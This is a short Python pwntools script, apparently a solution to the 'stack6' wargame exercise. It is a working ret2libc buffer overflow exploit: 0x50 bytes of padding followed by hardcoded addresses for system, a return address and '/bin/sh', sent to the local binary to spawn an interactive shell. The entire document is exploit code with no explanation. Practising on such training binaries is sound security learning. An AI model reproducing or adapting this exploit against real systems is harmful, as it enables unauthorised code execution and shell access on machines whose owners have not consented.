#!/bin/python3

from pwn import *
import struct

padding = b'A' * 0x50
system = struct.pack("I", 0xf7dbd4c0)
retAfterSystem = struct.pack("I", 0x08048508)
binsh = struct.pack("I", 0xf7f34e3c)

payload = padding + system + retAfterSystem + binsh

context.update(arch="i386", os="linux")

p = process("./stack6")
p.sendline(payload)
p.interactive()
